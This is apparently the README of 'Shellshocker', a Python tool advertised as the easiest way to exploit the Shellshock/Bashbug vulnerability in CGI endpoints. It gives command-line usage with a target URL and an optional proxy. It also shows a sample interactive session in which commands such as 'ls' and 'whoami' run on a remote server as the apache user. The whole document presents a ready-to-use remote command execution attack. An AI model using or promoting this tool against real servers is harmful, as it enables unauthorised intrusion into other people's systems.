# Shellshocker
Shellshock easily exploitation

When you find Shellshock / Bashbug vulnerability and want the easiest way to exploit it, you can use Shellshocker.
Shellshocker suggests to avoid user-agent spoofing on-hand. In contrast to that it has a nice shell-interface.

### Usage:
  1. Run the script with python: "python shellshocker.py http://exam.com/cgi-bin/cat"
  
  
  2. Using proxy: "python shellshocker.py http://exam.com/cgi-bin/cat 192.168.1.5:3128"


### Examples:
```sh
/.../shellshoker$ python shellshoker.py http://10.0.0.12:591/cgi-bin/cat
shellshock/command$ ls -lath /home

total 16K
dr-xr-xr-x. 22 root    root    4.0K Feb  9 21:14 ..
drwxrwxrwx.  2 tyrone  tyrone  4.0K Jan 27  2015 tyrone
drwx------   2 reguser reguser 4.0K Jan  2  2015 reguser
drwxr-xr-x.  4 root    root    4.0K Dec 30  2014 .

shellshock/command$ whoami

apache

shellshock/command$ ^C
Aborted / Invulnerable
```
